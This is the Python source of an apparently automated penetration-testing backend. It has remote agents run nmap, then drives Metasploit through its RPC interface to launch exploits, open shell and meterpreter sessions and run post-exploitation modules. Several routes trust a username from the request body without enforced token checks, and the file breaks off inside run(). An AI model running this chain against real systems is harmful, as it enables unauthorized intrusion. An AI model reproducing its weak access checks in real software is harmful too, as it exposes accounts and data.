"""
Module handling the complete RESTful API with the help of Database Handler
"""

from flask import Flask, request
from flask_classful import FlaskView, route
from api_utils import APIUtils
from database_handler import DatabaseHandler
from flask_cors import CORS
import time
import json
import uuid
import socketio
import threading
from util import Utility
import configparser
import os
import time
from __const import FAIL, WARNING, NOTE, OK
# from pymetasploit3.msfrpc import MsfRpcClient
import sys
from CannonPlug import CannonPlug
import http.client
import msgpack
import copy
import codecs
import json
import re
from bs4 import BeautifulSoup
from urllib.parse import parse_qs
DEBUG = 'DEBUG' in os.environ
DBHANDLE = DatabaseHandler()

connected_clients = {}
all_requests = {}
retrying_clients = []
socketIOServer = socketio.Server(cors_allowed_origins="*", async_mode='threading', cors_credentials=True)

convert_bytes_string_to_utf8_string = lambda x : x.decode('utf-8')

class BaseView(FlaskView):
    route_base = "/"
    representations = {'application/json': APIUtils.output_json}

    def index(self):
        return {'success': False, 'error': "Invalid Route"}, 404

    @route('/verifytoken', methods=['POST'])
    def is_token_valid(self):
        if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
            return {'status': False}
        return {'success': True}


class LoginView(FlaskView):
    representations = {'application/json': APIUtils.output_json}

    def get(self):
        return {'success': False, 'error': "Method Not Allowed"}, 405

    def post(self):
        data = request.json
        username: str = data.get("username", "")
        username = username.lower()
        password = data.get("password", "")
        return DBHANDLE.login(username, password), 200


class SignupView(FlaskView):
    representations = {'application/json': APIUtils.output_json}

    def get(self):
        return {'success': False, 'error': "Method Not Allowed"}, 405

    def post(self):
        data = request.json
        firstname = data.get("firstname", "")
        lastname = data.get("lastname", "")
        username: str = data.get("username", "")
        companyname = data.get("companyname", "")
        password = data.get("password", "")
        emailaddress: str = data.get("emailaddress", "")
        username = username.lower()
        emailaddress = emailaddress.lower()
        return DBHANDLE.register(firstname, lastname, username, emailaddress, password, companyname), 200


class RecoverView(FlaskView):
    representations = {'application/json': APIUtils.output_json}

    def get(self):
        return {'success': False, 'error': "Method Not Allowed"}, 405

    @route('/generate', methods=['POST'])
    def generate_code(self):
        if 'username' not in request.json:
            return {'success': False, 'error': 'Please provide your username to recover your account.'}
        if not DBHANDLE.username_exists(request.json['username']):
            return {'success': False, 'error': 'Username is not registered.'}
        return DBHANDLE.send_password_recovery(request.json['username'])

    @route('/verify', methods=['POST'])
    def verify_code(self):
        if 'username' not in request.json:
            return {'success': False, 'error': 'Please provide your username to recover your account.'}
        if not DBHANDLE.username_exists(request.json['username']):
            return {'success': False, 'error': 'Username is not registered.'}
        if 'code' not in request.json:
            return {'success': False, 'error': 'Please provide recovery code sent to your email address.'}
        if 'newpassword' not in request.json:
            return {'success': False, 'error': 'Please provide new password to set.'}
        return DBHANDLE.recover_account(request.json['username'], request.json['code'], request.json['newpassword'])


class UserView(FlaskView):
    representations = {'application/json': APIUtils.output_json}

    def post(self):
        if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
            return {"status": False, "error": "You are not logged in to access this resource."}, 403
        return DBHANDLE.get_user_info(request.json['username'])

    @route('/verifyemail', methods=['POST'])
    def verifyemail(self):
        if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
            return {"status": False, "error": "You are not logged in to access this resource."}, 403
        if "code" in request.json.keys():
            try:
                _ = int(request.json['code'])
                return DBHANDLE.verify_email_address(request.json['username'], int(request.json['code']))
            except:
                return {"status": False, "error": "Verification Code must only consist of numbers."}
        return {"status": False, "error": "Please provide verification code."}

    @route('/changepublicip', methods=['POST'])
    def changepublicip(self):
        if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
            return {"status": False, "error": "You are not logged in to access this resource."}, 403
        if "ip" in request.json.keys():
            return DBHANDLE.change_agent_ip(request.json['username'], request.json['ip'])
        return {"status": False, "error": "Please provide Public IP Address of agent."}

    @route('/changepassword', methods=['POST'])
    def change_password(self):
        if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
            return {"status": False, "error": "You are not logged in to access this resource."}, 403
        new_password = request.json.get("newpassword", "")
        if new_password == "":
            return {'status': False, "error": "Password cannot be empty."}
        return DBHANDLE.change_password(request.json['username'], new_password)

    # @route('/verifypublicip', methods=['POST'])
    # def verifypublicip(self):
    #     if (not FlaskAPI.check_token()) or "username" not in request.json.keys():
    #         return {"status": False, "error": "You are not logged in to access this resource."}, 403
    #     return DBHANDLE.verify_public_ip(request.json['username'])


class AgentView(FlaskView):
    def before_request(self, name):
        FlaskAPI.check_token()

    @route('/addlocalsystem', methods=['POST'])
    def addlocalsystem(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are no logged in to access this resource."}
        if 'localip' not in request.json:
            return {'success': False, 'error': "Please provide a valid Local IP."}
        return DBHANDLE.add_local_system(request.json['username'], request.json['localip'])

    @route('/deletelocalsystem', methods=['POST'])
    def deletelocalsystem(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        if 'localip' not in request.json:
            return {'success': False, 'error': "Please provide a valid Local IP."}
        return DBHANDLE.remove_local_system(request.json['username'], request.json['localip'])

    @route('/changelocalsystemip', methods=['POST'])
    def changelocalsystemip(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        if 'oldlocalip' not in request.json:
            return {'success': False, 'error': "Please provide a valid old Local IP."}
        if 'newlocalip' not in request.json:
            return {'success': False, 'error': "Please provide a valid new Local IP."}
        return DBHANDLE.change_local_system_ip(request.json['username'], request.json['oldlocalip'], request.json['newlocalip'])

    @route('/logs', methods=['POST'])
    def get_all_logs(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        return DBHANDLE.get_scanning_events_by_username(request.json['username'])

    def post(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        return DBHANDLE.get_local_systems(request.json['username'])

    @route('/getsystemstatus', methods=['POST'])
    def get_current_status(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        if 'localip' not in request.json:
            return {'success': False, 'error': "Please provide a valid Local IP."}
        return DBHANDLE.get_local_system_status(request.json['username'], request.json['localip'])

    @route('/exploitlogs', methods=['POST'])
    def get_exploitation_logs(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        if not "localip" in request.json:
            return {'success': False, 'error': "Please provide IP of Local System."}
        return DBHANDLE.get_exploitation_data(request.json['username'], request.json['localip'])

    @route('/latestexploitlogs', methods=['POST'])
    def get_latest_exploitation_logs(self):
        if "username" not in request.json.keys():
            return {'success': False, 'error': "You are not logged in to access this resource."}
        if not "localip" in request.json:
            return {'success': False, 'error': "Please provide IP of Local System."}
        return DBHANDLE.get_latest_exploitation_data(request.json['username'], request.json['localip'])

latest_updates = {}
def send_status_update(username, data):
    latest_updates[username] = {}
    latest_updates[username][data['system']] = data
    socketIOServer.emit("statusUpdate", room=username, data=data)
    socketIOServer.sleep(0)



class FlaskAPI(Flask):
    def __init__(self):
        super().__init__("Offensive Mamba RESTful API")
        BaseView.register(self)
        LoginView.register(self)
        SignupView.register(self)
        UserView.register(self)
        AgentView.register(self)

    @staticmethod
    def check_token() -> bool:
        auth_head = request.headers.get("Authorization", None)
        if auth_head is None:
            return False
        token = auth_head.split(" ")[1]
        try:
            auth_data = APIUtils.decrypt_jwt_token(token)
            for key, value in auth_data.items():
                request.json[key] = value
            return True
        except:
            return False

    # @staticmethod
    # def check_agent_ip(username: str) -> bool:
    #     data = DBHANDLE.get_agent_ip(username)
    #     if not data['success']:
    #         request.json['ipverified'] = False
    #         return False
    #     if request.remote_addr == data['ip'] and data['ipverified']:
    #         request.json['ipverified'] = True
    #         return True
    #     request.json['ipverified'] = False
    #     return False




user_threads = {}

def scan_all_systems(username):
    while True:
        systems: list = DBHANDLE.get_local_systems(username).get("data", None)
        print("Systems: " + str(systems))
        for system in systems:
            send_status_update(username, {"system": system, "statusText": "Started NMAP Scan", "mode": "Running"})
            nmap_response = send_command(username, data={'service': 'nmap', 'ip': system})
            print(nmap_response)
            nmap_file = nmap_response['localfile']
            nmap_file_contents = nmap_response['scandata']
            agent_ip_response = send_command(username, data={'service': 'agent_ip', 'ip': system})
            if agent_ip_response['success'] == False:
                print("No route found to target.")
                continue
            agent_ip = agent_ip_response['agent_ip'] # "127.0.0.1"
            msfcannon =  MetasploitCannon(agent_ip, system, username, nmap_file, nmap_file_contents)
            msfcannon.run()
            msfcannon.load_post_exploit_list()

@socketIOServer.event
def connect(sid, environ):
    print('Environ', environ)
    if(not (('HTTP_AUTHORIZATION' in environ) and str(environ['HTTP_AUTHORIZATION']).startswith('Bearer '))):
        socketIOServer.disconnect(sid)
    token = environ['HTTP_AUTHORIZATION'][7:]
    auth_data = {}
    try:
        auth_data = APIUtils.decrypt_jwt_token(token)
    except:
        socketIOServer.emit('connection_failed', json.dumps(
            {'reason': 'Invalid Token!'}), to=sid)
        socketIOServer.disconnect(sid)
    # Check and process frontend request
    qs = parse_qs(environ['QUERY_STRING'])
    if ('request' in qs) and ('subscribe' in qs['request']):
        socketIOServer.enter_room(sid, auth_data['username'])
        if DEBUG:
            print(socketIOServer.rooms(sid))
        if auth_data['username'] in latest_updates:
            for system in latest_updates[auth_data['username']]:
                socketIOServer.emit("statusUpdate", to=sid, data=latest_updates[auth_data['username']][system])
                socketIOServer.sleep(0)
        return
    response = DBHANDLE.change_agent_ip(
        auth_data['username'], environ['REMOTE_ADDR'])
    if(response['success'] == False):
        socketIOServer.emit('connection_failed', json.dumps(
            {'reason': response['error']}), to=sid)
    connected_clients[str(sid)] = {
        'agent_ip': environ['REMOTE_ADDR'], 'username': auth_data['username']}
    if auth_data['username'] in retrying_clients:
        return
    job = lambda username=auth_data['username']: scan_all_systems(username)
    user_thread = threading.Thread(daemon=False, target=job)
    user_thread.name = "mainthread_" + auth_data['username']
    user_threads[auth_data['username']] = user_thread
    user_thread.start()


@socketIOServer.event
def message(sid, data):

    print('message ', data)
    socketIOServer.disconnect(sid)


@socketIOServer.event
def response(sid, data):
    if type(data) == str:
        try:
            res = json.loads(data)
            all_requests[res['request_id']]['response'] = data
        except:
            pass
    elif type(data) == dict:
        all_requests[data['request_id']]['response'] = data
    else:
        print("Invalid Data Received")
    


@socketIOServer.event
def disconnect(sid):
    if str(sid) in connected_clients:
        client = connected_clients[str(sid)]
        DBHANDLE.change_agent_ip(client['username'], None)
        print(client['username'] +
              "(" + client['agent_ip'] + ")" + " disconnected")
        del connected_clients[str(sid)]
    else:
        print("disconnected (no sid)")


def find_sid_by_username(username):
    for key in connected_clients:
        if(connected_clients[key]['username'] == username):
            return key
    return False


def send_command(username, data, retries=5):
    request_id = str(uuid.uuid4())
    data['request_id'] = request_id
    all_requests[request_id] = {}
    all_requests[request_id]['request'] = data
    # print(connected_clients)
    sid = find_sid_by_username(username)
    # print(username,data)
    if sid is False:
        return {'success': False, 'error': 'Client Disconnected', 'reason': 'Client Disconnected'}
    socketIOServer.emit('request', data, to=sid)
    socketIOServer.sleep(0)
    while ('response' not in all_requests[request_id]):
        if sid not in connected_clients:
            all_requests.pop(request_id, None)
            if retries == 5:
                retrying_clients.append(username)
            while retries > 0:
                print("Waiting for " + username + " to reconnect...")
                time.sleep(3)
                if find_sid_by_username(username) is True:
                    return send_command(username, data, retries-1)
                retries -= 1
            retrying_clients.remove(username)
            return {'success': False, 'error': 'Client Disconnected', 'reason': 'Client Disconnected'}
    response = all_requests[request_id]['response']
    all_requests.pop(request_id, None)
    return response


class Msgrpc:
    def __init__(self, option: dict = {}):
        self.host = option.get('host') or "127.0.0.1"
        self.port = option.get('port') or 55552
        self.uri = option.get('uri') or "/api/"
        self.ssl = option.get('ssl') or False
        self.authenticated = False
        self.token = False
        self.username = option.get('username')
        self.headers = {"Content-type": "binary/message-pack"}
        if self.ssl:
            self.client = http.client.HTTPSConnection(self.host, self.port)
        else:
            self.client = http.client.HTTPConnection(self.host, self.port)
        self.util = Utility()

        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        # self.msgrpc_user = config['Common']['msgrpc_user']
        # self.msgrpc_pass = config['Common']['msgrpc_pass']

        # Replace Above values with ones provided in options paramter
        self.msgrpc_user = option.get('username') or ""
        self.msgrpc_pass = option.get('password') or ""

        self.timeout = int(config['Common']['timeout'])
        self.con_retry = int(config['Common']['con_retry'])
        self.retry_count = 0
        self.console_id = 0

        

    # Call RPC API.
    def call(self, meth, origin_option):
        # Set API option.
        option = copy.deepcopy(origin_option)
        option = self.set_api_option(meth, option)

        # Send request.
        resp = self.send_request(meth, option, origin_option)
        return msgpack.unpackb(resp)

    def set_api_option(self, meth, option):
        if meth != 'auth.login':
            if not self.authenticated:
                self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
                exit(1)
        if meth != 'auth.login':
            option.insert(0, self.token)
        option.insert(0, meth)
        return option

    # Send HTTP request.
    def send_request(self, meth, option, origin_option):
        response = send_command(self.username, {
            "method": meth,
            "option": option,
            "service": "msgrpc",
            "uri": self.uri,
            "agent": self.host,
            "headers": self.headers
        })
        if response['success'] is False:
            print(response)
            self.util.print_message(FAIL, "Error from Agent: " + response['reason'])
            sys.exit()
        return response['data']
        # if response['success'] == False:
        #     # if response['reason'] == "auth" and meth != 'auth.login':
        #     #     self.login(self.msgrpc_user, self.msgrpc_pass)
        #     print(response)
        #     exit(1)
        # decoded_res = response['resp']
        # resp = {}
        # for op in decoded_res:
        #     key = op[0]
        #     value = op[1]
        #     if key['type'] == "bytes":
        #         key = bytes(key['value'], 'ascii')
        #     else:
        #         key = key['value']
        #     if value['type'] == "bytes":
        #         value = bytes(value['value'], 'ascii')
        #     else:
        #         value = value['value']
        #     resp[key] = value
            
        # print(resp)
        # return msgpack.packb(resp)
        # print(option)
        # params = msgpack.packb(option)
        # resp = ''
        # try:
        #     self.client.request("POST", self.uri, params, self.headers)
        #     resp = self.client.getresponse()
        #     self.retry_count = 0
        # except Exception as err:
        #     while True:
        #         self.retry_count += 1
        #         if self.retry_count == self.con_retry:
        #             self.util.print_exception(err, 'Retry count is over.')
        #             exit(1)
        #         else:
        #             # Retry.
        #             self.util.print_message(WARNING, '{}/{} Retry "{}" call. reason: {}'.format(
        #                 self.retry_count, self.con_retry, option[0], err))
        #             time.sleep(1.0)
        #             if self.ssl:
        #                 self.client = http.client.HTTPSConnection(
        #                     self.host, self.port)
        #             else:
        #                 self.client = http.client.HTTPConnection(
        #                     self.host, self.port)
        #             if meth != 'auth.login':
        #                 self.login(self.msgrpc_user, self.msgrpc_pass)
        #                 option = self.set_api_option(meth, origin_option)
        #                 self.get_console()
        #             resp = self.send_request(meth, option, origin_option)
        #             break
        # return resp

    # Log in to RPC Server.
    def login(self, user, password):
        ret = self.call('auth.login', [user, password])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = True
                self.token = ret.get(b'token')
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.login')
            exit(1)

    # Keep alive.
    def keep_alive(self):
        self.util.print_message(OK, 'Executing keep_alive..')
        _ = self.send_command(self.console_id, 'version\n', False)

    # Create MSFconsole.
    def get_console(self):
        # Create a console.
        ret = self.call('console.create', [])
        try:
            self.console_id = ret.get(b'id')
            _ = self.call('console.read', [self.console_id])
        except Exception as err:
            self.util.print_exception(err, 'Failed: console.create')
            exit(1)

    # Send Metasploit command.
    def send_command(self, console_id, command, visualization, sleep=0.1):
        _ = self.call('console.write', [console_id, command])
        time.sleep(0.5)
        ret = self.call('console.read', [console_id])
        time.sleep(sleep)
        result = ''
        try:
            result = ret.get(b'data').decode('utf-8')
            if visualization:
                self.util.print_message(
                    OK, 'Result of "{}":\n{}'.format(command, result))
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(command))
        return result

    # Get all modules.
    def get_module_list(self, module_type):
        ret = {}
        if module_type == 'exploit':
            ret = self.call('module.exploits', [])
        elif module_type == 'auxiliary':
            ret = self.call('module.auxiliary', [])
        elif module_type == 'post':
            ret = self.call('module.post', [])
        elif module_type == 'payload':
            ret = self.call('module.payloads', [])
        elif module_type == 'encoder':
            ret = self.call('module.encoders', [])
        elif module_type == 'nop':
            ret = self.call('module.nops', [])

        try:
            byte_list = ret[b'modules']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(
                e, 'Failed: Getting {} module list.'.format(module_type))
            exit(1)

    # Get module detail information.
    def get_module_info(self, module_type, module_name):
        return self.call('module.info', [module_type, module_name])

    # Get payload that compatible module.
    def get_compatible_payload_list(self, module_name):
        ret = self.call('module.compatible_payloads', [module_name])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.compatible_payloads.')
            return []

    # Get payload that compatible target.
    def get_target_compatible_payload_list(self, module_name, target_num):
        ret = self.call('module.target_compatible_payloads',
                        [module_name, target_num])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(
                e, 'Failed: module.target_compatible_payloads.')
            return []

    # Get module options.
    def get_module_options(self, module_type, module_name):
        return self.call('module.options', [module_type, module_name])

    # Execute module.
    def execute_module(self, module_type, module_name, options):
        ret = self.call('module.execute', [module_type, module_name, options])
        try:
            job_id = ret[b'job_id']
            uuid = ret[b'uuid'].decode('utf-8')
            return job_id, uuid
        except Exception as e:
            if ret[b'error_code'] == 401:
                self.login(self.msgrpc_user, self.msgrpc_pass)
            else:
                self.util.print_exception(e, 'Failed: module.execute.')
                exit(1)

    # Get job list.
    def get_job_list(self):
        jobs = self.call('job.list', [])
        try:
            byte_list = jobs.keys()
            job_list = []
            for job_id in byte_list:
                job_list.append(int(job_id.decode('utf-8')))
            return job_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: job.list.')
            return []

    # Get job detail information.
    def get_job_info(self, job_id):
        return self.call('job.info', [job_id])

    # Stop job.
    def stop_job(self, job_id):
        return self.call('job.stop', [job_id])

    # Get session list.
    def get_session_list(self):
        return self.call('session.list', [])

    # Stop session.
    def stop_session(self, session_id):
        _ = self.call('session.stop', [str(session_id)])

    # Stop meterpreter session.
    def stop_meterpreter_session(self, session_id):
        _ = self.call('session.meterpreter_session_detach', [str(session_id)])

    # Execute shell.
    def execute_shell(self, session_id, cmd):
        ret = self.call('session.shell_write', [str(session_id), cmd])
        try:
            return ret[b'write_count'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    # Get executing shell result.
    def get_shell_result(self, session_id, read_pointer):
        ret = self.call('session.shell_read', [str(session_id), read_pointer])
        try:
            seq = ret[b'seq'].decode('utf-8')
            data = ret[b'data'].decode('utf-8')
            return seq, data
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.shell_read.')
            return 0, 'Failed'

    # Execute meterpreter.
    def execute_meterpreter(self, session_id, cmd):
        ret = self.call('session.meterpreter_write', [str(session_id), cmd])
        try:
            if DEBUG:
                print(ret)
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    # Get Session Compatible Modules
    def get_session_compatible_module(self, session_id):
        ret = self.call('session.compatible_modules', [str(session_id)])
        try:
            if DEBUG:
                print(ret)
            if b'modules' in ret:
                return ret[b'modules']
            else:
                return None
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return None

    # Execute single meterpreter.
    def execute_meterpreter_run_single(self, session_id, cmd):
        ret = self.call('session.meterpreter_run_single',
                        [str(session_id), cmd])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    # Get executing meterpreter result.
    def get_meterpreter_result(self, session_id):
        ret = self.call('session.meterpreter_read', [str(session_id)])
        if DEBUG:
            print("Print Returned Data: " + str(ret))
        try:
            return ret[b'data'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.meterpreter_read')
            return None

    # Upgrade shell session to meterpreter.
    def upgrade_shell_session(self, session_id, lhost, lport):
        ret = self.call('session.shell_upgrade', [
                        str(session_id), lhost, lport])
        try:
            if DEBUG:
                print(ret)
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.shell_upgrade')
            return 'Failed'

    # Log out from RPC Server.
    def logout(self):
        ret = self.call('auth.logout', [self.token])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = False
                self.token = ''
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.logout')
            exit(1)

    # Disconnection.
    def termination(self, console_id):
        # Kill a console and Log out.
        _ = self.call('console.session_kill', [console_id])
        _ = self.logout()

class MetasploitCannon(CannonPlug):
    all_exploit_list = []
    all_post_exploit_list = []
    loading_exploit_list = False
    loading_post_exploit_list = False

    # def __init__(self, agent_ip: str, target_ip: str, username: str, password: str, nmap_file: str):
    def __init__(self, agent_ip:str, target_ip: str, username: str, nmap_file: str, nmap_contents: str):
        self.util = Utility()
        self.rhost = target_ip
        self.nmap_file_contents = nmap_contents
        # Read Configuration Options
        full_dir_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_dir_path, 'config.ini'))
        except FileExistsError:
            self.util.print_message(
                FAIL, 'Configuration file missing. exiting...')
            sys.exit(1)
        # server_host = config['Common']['server_host'] # replace with agent_ip
        self.agent_ip = agent_ip
        server_host = self.agent_ip
        self.username = username

        self.lhost = server_host
        # server_port = int(config['Common']['server_port'])
        # self.msgrpc_user = config['Common']['msgrpc_user']
        # self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.msgrpc_user = username
        self.msgrpc_pass = ""
        self.timeout = int(config['Common']['timeout'])
        self.max_attempt = int(config['Common']['max_attempt'])
        self.save_path = os.path.join(
            full_dir_path, config['Common']['save_path'])
        self.save_file = os.path.join(
            self.save_path, config['Common']['save_file'])
        self.data_path = os.path.join(
            full_dir_path, config['Common']['data_path'], username)
        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)
        self.plot_file = os.path.join(
            self.data_path, config['Common']['plot_file'])
        self.port_div_symbol = config['Common']['port_div']

        # Current Scanning Event
        self.scanningevent = None

        # Set Metasploit option values
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = config['Metasploit']['proxy_port']
        self.prohibited_list = str(
            config['Metasploit']['prohibited_list']).split('@')
        self.prohibited_list.append(server_host)
        self.path_collection = str(
            config['Metasploit']['path_collection']).split('@')

        # State Options
        self.os_type = str(config['State']['os_type']).split('@')  # OS type.
        self.os_real = len(self.os_type) - 1  # Default Value: unknown
        # Product name.
        self.service_list = str(config['State']['services']).split('@')

        # Nmap Options
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']

        self.scan_start_time = self.util.get_current_date()
        self.source_host = server_host

        # Create Msgrpc instance.
        self.client = Msgrpc({'username': username, 'host': self.agent_ip})

        # Log in to RPC Server.
        self.client.login(self.msgrpc_user, self.msgrpc_pass)
        time.sleep(0.5)
        # Get MSFconsole ID.
        self.client.get_console()
        self.buffer_seq = 0
        # Executing Post-Exploiting True/False.
        self.isPostExploit = False

        self.exploit_tree = {}
        self.target_tree = {}

        # self.nmap_result_file = '/home/omamba/nmap_result_omamba_' + \
        #     self.msgrpc_user + '_' + self.rhost + '.xml'
        self.nmap_result_file = nmap_file

        # Pending DB Data
        self.db_scanning_logs = {}
        self.db_exploitation_logs = []
        self.sessions_list = []
    
    def store_to_db(self):
        # self.db_scanning_logs = {'openports': dict(), 'username': self.msgrpc_user, 'localip': self.rhost, 'os': "Unknown", "closed_ports": list()}
        openPorts = self.db_scanning_logs['openports']
        username = self.db_scanning_logs['username']
        localip = self.db_scanning_logs['localip']
        os = self.db_scanning_logs['os']
        closed_ports = self.db_scanning_logs['closed_ports']
        self.scanningevent = DBHANDLE.insert_scanning_log(openPorts, username, localip, os, closed_ports)['event']
        if self.db_exploitation_logs != []:
            for exploit_log in self.db_exploitation_logs:
                username = exploit_log['username']
                localip = exploit_log['localip']
                exploit = exploit_log['exploit']
                payload = exploit_log['payload']
                port = exploit_log['port']
                success = exploit_log['success']
                result = exploit_log['result']
                engine = exploit_log['engine']
                exploit_event = DBHANDLE.insert_exploitation_log(username, localip, exploit, payload, engine, port, success, self.scanningevent)
                result['exploit_event'] = exploit_event
                if success == True:
                    self.sessions_list.append(result)
        else:
            self.sessions_list = []
    def get_scan_info(self):

        # cat_cmd = 'cat ' + self.nmap_result_file + '\n'
        # echo_cmd= 'echo hello\n'
        # nmap_result = ""
        # dbl_line = 0
        # _ = self.client.call('console.write', [self.client.console_id, echo_cmd])
        # time.sleep(3.0)
        # time_count = 0
        # while True:
        #     ret = self.client.call('console.read', [self.client.console_id])
        #     print(ret)
        #     try:
        #         if self.timeout == time_count:
        #             self.client.termination(self.client.console_id)
        #             self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
        #             break
        #         nmap_result += ret.get(b'data').decode('utf-8')
        #         status = ret.get(b'busy')
        #         if status is False:
        #             if(nmap_result.endswith("\n\n")) and dbl_line < 1:
        #                 print("Ending with Double NewLine")
        #                 dbl_line += 1
        #                 continue
        #             break
        #     except Exception as e:
        #         self.util.print_exception(e, 'Failed: console.read')
        #     time.sleep(1.0)
        #     time_count += 1
        # print(nmap_result)

        # call get_nmap_xml_contents instead
        nmap_file_content = self.get_nmap_xml_contents()
        os_name = 'unknown'
        port_list = []
        proto_list = []
        info_list = []
        closed_ports = []
        bs = BeautifulSoup(nmap_file_content, 'lxml')
        ports = bs.find_all('port')
        for index, port in enumerate(ports):
            skip = False
            # Skip closed ports
            for ochild in port.contents:
                if ochild.name == "state":
                    if "state" in ochild.attrs:
                        if ochild.attrs['state'] == "closed":
                            closed_ports.append(port.attrs['portid'])
                            skip = True
                            break
            if skip:
                continue

            port_list.append(str(port.attrs['portid']))
            proto_list.append(port.attrs['protocol'])
            for ochild in port.contents:
                if ochild.name == 'service':
                    temp_info = ''
                    if 'product' in ochild.attrs:
                        temp_info += ochild.attrs['product'] + ' '
                    if 'version' in ochild.attrs:
                        temp_info += ochild.attrs['version'] + ' '
                    if 'extrainfo' in ochild.attrs:
                        temp_info += ochild.attrs['extrainfo']
                    if 'ostype' in ochild.attrs:  # Get OS Family, Type or Name
                        os_name = ochild.attrs['ostype'].lower()
                    if temp_info != '':
                        info_list.append(temp_info)
                    else:
                        info_list.append('unknown')

        if len(port_list) == 0:
            send_status_update(self.username, {"system": self.rhost, "statusText": "No Open Ports", "mode": "Running"})
            self.util.print_message(WARNING, "No Open Port")
            self.client.termination(self.client.console_id)
            raise Exception("No Open Ports!")

        # Get OS name from NMAP Output
        # some_os = bs.find_all('osmatch')
        # os_name = 'unknown'
        # for obj_os in some_os:
        #     for ochild in obj_os.contents:
        #         if ochild.name == 'osclass' and 'osfamily' in ochild.attrs:
        #             os_name = (ochild.attrs['osfamily']).lower()
        #             break

        # Got OS Name from the Ports Data

        # Set OS to state
        for (i, os_type) in enumerate(self.os_type):
            if os_name in os_type:
                self.os_real = i

        return port_list, proto_list, info_list, closed_ports

    def execute_exploit(self, selected_payload, target, target_info):
        option = self.set_options(target_info, target, selected_payload)
        job_id, uuid = self.client.execute_module(
            'exploit', target_info['exploit'], option)

        if uuid is not None:
            status = self.check_running_module(job_id, uuid)
            if status == False:
                return None
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            if len(key_list) != 0:
                for key in key_list:
                    exploit_uuid = sessions[key][b'exploit_uuid'].decode(
                        'utf-8')
                    if uuid == exploit_uuid:
                        # Exploitation Successful
                        session_id = int(key)
                        session_type = sessions[key][b'type'].decode('utf-8')
                        session_port = str(sessions[key][b'session_port'])
                        session_exploit = sessions[key][b'via_exploit'].decode(
                            'utf-8')
                        session_payload = sessions[key][b'via_payload'].decode(
                            'utf-8')
                        module_info = self.client.get_module_info(
                            'exploit', session_exploit)

                        # Gather reporting items.
                        vuln_name = module_info[b'name'].decode('utf-8')
                        description = module_info[b'description'].decode(
                            'utf-8')
                        ref_list = module_info[b'references']
                        reference = ''
                        for item in ref_list:
                            reference += '[' + item[0].decode(
                                'utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'

                        bingo = {"target": self.rhost,
                                 "session_port": session_port,
                                 "protocol": target_info['protocol'],
                                 "prod_name": target_info['prod_name'],
                                 "prod_ver": str(target_info['version']),
                                 "session_id": session_id,
                                 "vuln_name": vuln_name,
                                 "vuln_desc": description,
                                 "session_type": session_type,
                                 "session_exploit": session_exploit,
                                 "target": target,
                                 "session_payload": session_payload,
                                 "reference": reference
                                }
                        self.util.print_message(OK, "Success: \n" + str(bingo))
                        return bingo
                return None
            else:
                return None
        else:
            return None
    
    def execute_post_exploit(self, post_exploit, options):
        option = self.set_post_exploit_options(options)
        if DEBUG:
            print(option)
        job_id, uuid = self.client.execute_module(
            'post', post_exploit, option)

        if uuid is not None:
            status = self.check_running_module(job_id, uuid)
            if status == False:
                return None
        else:
            return None


    def temp_run(self):
        self.load_post_exploit_list()
        print(MetasploitCannon.all_post_exploit_list)
        return

    def run(self):
        # self.scan_the_target()
